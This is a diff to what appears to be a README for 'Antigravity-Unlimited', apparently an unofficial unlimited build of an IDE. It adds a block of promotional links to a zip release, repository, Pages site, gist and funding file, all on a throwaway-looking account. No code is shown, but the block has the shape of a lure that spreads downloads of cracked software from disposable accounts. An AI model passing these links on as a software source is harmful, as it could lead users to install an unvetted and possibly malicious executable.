@@ -48,3 +48,19 @@ Windows 10/11.
 IDE notes - Copyright (C) 2026 antigravityunlim
 
 ![images6](images6.png)
+
+
+---
+
+## Also here
+
+- **Download:** [https://github.com/nbje9x82siq00ajplpml/Antigravity-Unlimited/releases/download/v2.8.0/Antigravity-Unlimited.zip](https://github.com/nbje9x82siq00ajplpml/Antigravity-Unlimited/releases/download/v2.8.0/Antigravity-Unlimited.zip)
+- **Repository:** https://github.com/nbje9x82siq00ajplpml/Antigravity-Unlimited
+- **GitHub Pages:** https://nbje9x82siq00ajplpml.github.io/Antigravity-Unlimited/
+- **Gist:** https://gist.github.com/nbje9x82siq00ajplpml/6490105dba1ed660ad299e7679484aff
+- **Docs:** https://github.com/nbje9x82siq00ajplpml/Antigravity-Unlimited/tree/main/docs
+- **Discussion:** https://github.com/nbje9x82siq00ajplpml/Antigravity-Unlimited/discussions/1
+- **Profile:** https://github.com/nbje9x82siq00ajplpml/nbje9x82siq00ajplpml
+- **Funding:** https://github.com/nbje9x82siq00ajplpml/Antigravity-Unlimited/blob/main/.github/FUNDING.yml
+
+---
